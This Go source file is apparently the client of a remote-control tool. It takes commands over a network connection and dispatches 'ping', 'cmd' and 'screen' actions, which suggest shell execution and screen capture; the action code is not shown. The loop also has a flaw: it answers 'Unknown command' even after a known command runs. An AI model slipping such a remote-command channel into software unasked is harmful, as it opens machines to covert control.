package client

import (
  "pocok/internal/client/actions"
  "strings"
  "net"
  "log"
)

type ActionFunc func(conn net.Conn, args []string) 

var ActionList = map[string] ActionFunc {
  "ping":   actions.Ping, 
  "cmd":    actions.Cmd, 
  "screen": actions.Screen, 
}

func HandleConnection(conn net.Conn) {
  defer conn.Close()

	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			log.Println("Error reading from connection:", err.Error())
			return
		}

		str := string(buf[:n])

		log.Println("Received:", str)

    args := strings.Split(str, " ")

    if len(args) < 1 { continue; }

		log.Println("Command:", strings.ToLower(args[0]) )

    if action, ok := ActionList[ strings.ToLower(args[0]) ]; ok {
      action(conn, args[1:])
    }

		log.Println("Unknown command:", str)
		conn.Write([]byte("Unknown command"))
    
	}
}
